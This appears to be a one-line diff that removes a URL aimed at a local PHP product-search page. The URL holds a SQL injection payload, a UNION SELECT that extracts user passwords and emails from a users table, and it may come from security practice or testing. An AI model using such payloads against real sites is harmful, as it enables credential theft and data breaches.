@@ -1,1 +1,0 @@
-http://localhost:8000/search_product.php?search=search&keyword=test%27%20union%20select%201,user_password,3,4,5,6,7,8,user_email%20from%20users--%20-
